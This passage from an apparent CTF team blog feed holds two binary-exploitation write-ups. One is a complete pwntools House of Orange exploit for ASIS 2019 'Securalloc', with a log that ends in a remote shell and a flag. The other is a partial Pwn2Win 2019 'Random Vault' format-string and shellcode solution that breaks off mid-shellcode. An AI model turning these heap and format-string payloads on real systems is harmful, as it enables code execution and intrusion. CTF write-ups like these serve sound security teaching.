forge an IO file that meets some <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/genops.c#L701" target="_blank" rel="noopener">specifications</a>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">   &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">    ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>Also need to change <strong>vtable</strong> address to a place we can control in this case I used a place on the heap.</p><p>We need then the <strong>_IO_OVERFLOW</strong> pointer to be setted to system, the fp header is set to <strong>/bin/sh</strong>.</p><p>we first allocate a chunk of size <strong>0x0</strong> but with the summation of <strong>securealloc</strong> the size will be <strong>0x0+0x10 =0x10</strong>, this will create a small chunk and it’s going to be allocated in the space of the first chunk we freed taking up 0x10 of it’s space, and create a new unsortedbin as we can see below:<br><a data-fancybox="gallery" href="https://i.imgur.com/0li57Hx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0li57Hx.png" alt><br></a><br>This is the payload we want to use:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(HEAPCANARY) <span class="comment"># rewrite canary to avoid security trigger</span></span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span> <span class="comment"># fp header is set to **/bin/sh**</span></span><br><span class="line">payload += p64(<span class="number">0x61</span>) <span class="comment"># chunk size</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># FD flags field</span></span><br><span class="line">payload += p64(_IO_LIST_ALL<span class="number">-0x10</span>) <span class="comment"># BK point where we want to write</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">18</span> <span class="comment"># from _IO_read_ptr to __pad5</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># fp-&gt;_mode &lt;= 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># unused</span></span><br><span class="line">payload += p64(HEAP+<span class="number">0x100</span>) <span class="comment"># VTABLE ADDRESS</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment">#OUR VTABLE starts here which is located at HEAPBASE+0x100</span></span><br><span class="line">payload += p64(SYSTEM) <span class="comment"># _IO_OVERFLOW overwritten with system</span></span><br></pre></td></tr></table></figure><p>Creating the chunks:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x0</span>) <span class="comment"># create 0x21 chunk</span></span><br><span class="line">edit(payload) <span class="comment"># overflow 0x21 chunk</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># trigger _IO_OVERFLOW aka system('/bin/sh')</span></span><br></pre></td></tr></table></figure><p>The data after the overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/MrGMNXd.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/MrGMNXd.png" alt><br></a><br>The exploit is not very reliable and sometimes fails so I putted it in an infinite loop to avoid rerunning the script at failurers:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"76.74.177.238"</span>, <span class="string">"9001"</span></span><br><span class="line">filename = <span class="string">"./securalloc.elf"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc <span class="comment"># get a docker container that runs libc-2.23 or LD_PRELOAD</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LIBC</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">4</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LIBALLOC</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">9</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp, labp=[])</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    LIBALLOC = get_LIBALLOC(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> labp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(LIBALLOC+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(data)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> r</span><br><span class="line">        r = getConn()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># leak libc and heap (_IO_2_1_stderr)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">            debug([<span class="number">0xBFF</span>,<span class="number">0xC67</span>,<span class="number">0xC7D</span>,<span class="number">0xC39</span>,<span class="number">0xD45</span>,<span class="number">0xB6E</span>], [<span class="number">0xA0B</span>])</span><br><span class="line">        add(<span class="number">0x60</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">        show()</span><br><span class="line">        r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        HEAPADDR = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        HEAP = HEAPADDR - <span class="number">0xf0</span></span><br><span class="line">        log.info(<span class="string">"HEAPADDR 0x%x"</span> % HEAPADDR)</span><br><span class="line">        log.info(<span class="string">"HEAP 0x%x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        add(<span class="number">0x10</span>)</span><br><span class="line">        show()</span><br><span class="line">        r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        IOFILEJUMPS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)) <span class="comment"># _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">        LIBC = IOFILEJUMPS - libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">        _IO_LIST_ALL = LIBC + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">        SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">        log.info(<span class="string">"IO_file_jumps 0x%x"</span> % IOFILEJUMPS)</span><br><span class="line">        log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># leak heap canary (/dev/urandom buffer)</span></span><br><span class="line">        add(<span class="number">0x140</span>)</span><br><span class="line">        add(<span class="number">0x8</span>)</span><br><span class="line">        show()</span><br><span class="line">        HEAPCANARY = u64(r.recvline().rstrip()[<span class="number">-7</span>::].rjust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        log.info(<span class="string">"HEAPCANARY 0x%x"</span> % HEAPCANARY)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3) HOUSE OF ORANGE</span></span><br><span class="line">        </span><br><span class="line">        add(<span class="number">0x3e0</span>) <span class="comment"># fastbin(0x80) goes to a smallbin because allocation is &gt; 1000 (0x3e0+0x10 = 1008)</span></span><br><span class="line">        payload = p64(HEAPCANARY)</span><br><span class="line">        payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">        payload += p64(<span class="number">0x61</span>) <span class="comment">#size</span></span><br><span class="line">        payload += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># FD</span></span><br><span class="line">        payload += p64(_IO_LIST_ALL<span class="number">-0x10</span>) <span class="comment"># BK</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">18</span> <span class="comment"># unused</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) <span class="comment"># fp-&gt;_mode &lt;= 0</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># unused</span></span><br><span class="line">        payload += p64(HEAP+<span class="number">0x100</span>) <span class="comment"># VTABLE ADDRESS</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment">#VTABLE</span></span><br><span class="line">        payload += p64(SYSTEM)</span><br><span class="line">        add(<span class="number">0x0</span>)</span><br><span class="line">        edit(payload)</span><br><span class="line">        add(<span class="number">0x10</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'[vdso]\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'ls -ltah'</span>) <span class="comment"># send ls command</span></span><br><span class="line">        r.recvline_regex(<span class="string">r'\d\d:\d\d\s\.'</span>) <span class="comment"># to check if ls ran succefully</span></span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError, KeyboardInterrupt:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ python securalloc.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/securalloc/securalloc.elf'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/securalloc/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 76.74.177.238 on port 9001: Done</span><br><span class="line">[*] HEAPADDR 0x565285b230f0</span><br><span class="line">[*] HEAP 0x565285b23000</span><br><span class="line">[*] IO_file_jumps 0x7f1728c6b6e0</span><br><span class="line">[*] LIBC 0x7f17288a8000</span><br><span class="line">[*] HEAPCANARY 0x1ecb79a1e3203a00</span><br><span class="line">[*] Closed connection to 76.74.177.238 port 9001</span><br><span class="line">[+] Opening connection to 76.74.177.238 on port 9001: Done</span><br><span class="line">[*] HEAPADDR 0x5643a10cb0f0</span><br><span class="line">[*] HEAP 0x5643a10cb000</span><br><span class="line">[*] IO_file_jumps 0x7fde0d99b6e0</span><br><span class="line">[*] LIBC 0x7fde0d5d8000</span><br><span class="line">[*] HEAPCANARY 0x816203195eb4af00</span><br><span class="line">[*] Closed connection to 76.74.177.238 port 9001</span><br><span class="line">[+] Opening connection to 76.74.177.238 on port 9001: Done</span><br><span class="line">[*] HEAPADDR 0x55e2209950f0</span><br><span class="line">[*] HEAP 0x55e220995000</span><br><span class="line">[*] IO_file_jumps 0x7effb1b836e0</span><br><span class="line">[*] LIBC 0x7effb17c0000</span><br><span class="line">[*] HEAPCANARY 0xda7a7dfc7356dd00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">drwxr-xr-x 1 root root 4.0K Nov 13 12:35 ..</span><br><span class="line">-r--r----- 1 root pwn    33 Aug 22 10:26 flag.txt</span><br><span class="line">-r-xr-x--- 1 root pwn   10K Aug 22 09:08 chall</span><br><span class="line">-r-xr-x--- 1 root pwn    37 Aug 22 05:02 redir.sh</span><br><span class="line">$ cat flag.txt</span><br><span class="line">ASIS&#123;l3ft0v3r_ru1n3d_3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Securalloc&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;167&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;26&lt;br&gt;&lt;strong&gt;Category&lt;/stro
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="House of Orange" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Orange/"/>
    
    
      <category term="houseoforange" scheme="https://teamrocketist.github.io/tags/houseoforange/"/>
    
      <category term="io_file_struct" scheme="https://teamrocketist.github.io/tags/io-file-struct/"/>
    
      <category term="asisfinals2019" scheme="https://teamrocketist.github.io/tags/asisfinals2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win 2019 CTF - Random Vault</title>
    <link href="https://teamrocketist.github.io/2019/11/11/Pwn-Pwn2Win-2019-CTF-Random-Vault/"/>
    <id>https://teamrocketist.github.io/2019/11/11/Pwn-Pwn2Win-2019-CTF-Random-Vault/</id>
    <published>2019-11-11T05:44:54.000Z</published>
    <updated>2019-11-11T11:54:16.447Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Random Vault</strong> </p><p><em>303 points</em></p></blockquote><blockquote><p><strong>Description</strong>:</p><p>While analysing data obtained through our cyber operations, our analysts have discovered an old service in HARPA<br>infrastructure. This service has been used to store the agency’s secrets, but it has been replaced by a more<br>sophisticated one after a few years. By mistake, this service remained available on Internet until December 2019,<br>when HARPA agents realized this flaw and took it down. We suspect this service is vulnerable. We need your help to<br>exploit its vulnerability and extract the secrets that are still kept on the server.<br><a href="https://mega.nz/#!ayxQWahC!kU-uq0KKqrnoXfAr9MINEPn_dSbSnGn3AF1KjyWBfGU" target="_blank" rel="noopener">random_vault</a></p></blockquote><h3 id="Fast-Solution"><a href="#Fast-Solution" class="headerlink" title="Fast Solution"></a>Fast Solution</h3><ol><li>Use 1st format string to leak pie address</li><li>Use 2nd format string to modify Seed and QWORD_5000 to shellcode place.</li><li>Use shell codes jumps to manage to execute read syscall and write shellcode from the stdin.</li></ol><h3 id="Identifying-the-vulnerability"><a href="#Identifying-the-vulnerability" class="headerlink" title="Identifying the vulnerability"></a>Identifying the vulnerability</h3><p>First thing to do is the check the security settings enabled:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec random_vault</span><br><span class="line">[*] <span class="string">'/ctf/pwn/RandomVault/random_vault'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><strong>Full RELRO</strong> is enabled so the global offset table is <strong>read only</strong> which is a thing we need to take into consideration on this challenge. Also <strong>PIE</strong> is enabled too this means if we require to get an address of a function or a pointer to a specific address of the program we will need to get a leak to calculate the <strong>PIE</strong> base.</p><p>We can easily find a vulnerability in the username field:<br><a data-fancybox="gallery" href="https://i.imgur.com/NW770IY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NW770IY.png" alt><br></a><br>Unfortunately we can only use twice, one when the <strong>program starts</strong> and one <strong>username change</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/7mMRLW7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7mMRLW7.png" alt><br></a></p><p><strong>qword_4020</strong> is set to a very large <strong>negative</strong> number, which prevents us from at every username change to revert the global back to its original value, well <strong>theoretically</strong> is possible but we only have <strong>81 characters</strong> to do it, because of this it’s not possible to do it with 4 <strong>%hn</strong>‘s, instead we could do it with two <strong>%n</strong>‘s but it’s way too many characters to print, this would take hours so this option was <strong>discarded</strong> by me in the beginning.</p><p>Also something interesting happens on the usual function where the <strong>setvbuff</strong> functions are lying in:<br><a data-fancybox="gallery" href="https://i.imgur.com/ZyunV3G.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ZyunV3G.png" alt><br></a><br><strong>mprotect</strong> is changing the protections settings from a region of memory at <strong>qword_5000</strong> 0x1000 bytes are now <strong>RWX</strong> this means in this region we can <strong>read</strong>, <strong>write</strong> and <strong>execute</strong> code.</p><h3 id="Leaking-pie"><a href="#Leaking-pie" class="headerlink" title="Leaking pie"></a>Leaking pie</h3><p>We have a format string vulnerability right at the start of the program so let’s leak some addresses with:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'Username: '</span>,<span class="string">'%7$lx|%11$lx'</span>)</span><br></pre></td></tr></table></figure><p>An address aligned with the <strong>PIE</strong> base is located at the 11 position the stack, also an address aligned with the stack addresses is located at the 7th but I didn’t require this one for my current solution.</p><p>One thing we could take from the store function:<br><a data-fancybox="gallery" href="https://i.imgur.com/Lf4YR4o.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Lf4YR4o.png" alt><br></a><br>Store function will <strong>store</strong> pointers from the stdin on <strong>random</strong> locations, which are generated based on a <strong>seed</strong>, we can <strong>control</strong> this seed by using <strong>format string</strong>, knowing those locations on that special memory region <strong>RWX</strong> we can modify <strong>qword_5000</strong> pointer to one of them and <strong>execute</strong> our shellcode.</p><p>Here is a function I wrote in python to calculate the offsets with the <strong>seed 0</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">indices_with_seed_zero</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    libc.srand(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        v0 = libc.rand()</span><br><span class="line">        q = ((v0 &gt;&gt; <span class="number">0x38</span>) + v0) &amp; <span class="number">0xff</span> - ((v0 &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">print</span> q*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>The output:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python random_vault.py </span><br><span class="line"><span class="number">824</span></span><br><span class="line"><span class="number">1584</span></span><br><span class="line"><span class="number">840</span></span><br><span class="line"><span class="number">920</span></span><br><span class="line"><span class="number">648</span></span><br><span class="line"><span class="number">2040</span></span><br><span class="line"><span class="number">592</span></span><br></pre></td></tr></table></figure><p>So the locations that we are going to write are:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Index <span class="number">0</span>: PIE_BASE+<span class="number">824</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">1</span>: PIE_BASE+<span class="number">1584</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">2</span>: PIE_BASE+<span class="number">840</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">3</span>: PIE_BASE+<span class="number">920</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">4</span>: PIE_BASE+<span class="number">648</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">5</span>: PIE_BASE+<span class="number">2040</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">6</span>: PIE_BASE+<span class="number">592</span>+<span class="number">0x5010</span></span><br></pre></td></tr></table></figure><p>The format string code used to overwrite <strong>SEED</strong> and <strong>qword_5000</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SEED = PIE+<span class="number">0x5008</span></span><br><span class="line">QWORD5000 = PIE+<span class="number">0x5000</span></span><br><span class="line">unk_5010 = PIE+<span class="number">0x5010</span></span><br><span class="line"></span><br><span class="line">LOW_QWORD4020 = unk_5010 &amp; <span class="number">0xf000</span> | <span class="number">0x348</span></span><br><span class="line">payload = <span class="string">'%29$ln'</span> <span class="comment"># Clear SEED</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%30$hn'</span>.format(LOW_QWORD4020)</span><br><span class="line"></span><br><span class="line">s = payload</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">40</span>-len(payload))</span><br><span class="line">s += p64(SEED)</span><br><span class="line">s += p64(QWORD5000)</span><br></pre></td></tr></table></figure></p><p><strong>Index 0</strong> and <strong>Index 2</strong> are very near to each other! 0x10 byte apart, I used this to my advantage and manage to call a read syscall successfully.</p><p>First on <strong>index 0</strong> I cleared <strong>RDI</strong>  register and jumped to <strong>Index 2</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor edi, edi ; clears rdi (we want to read from STDIN so we need this to be 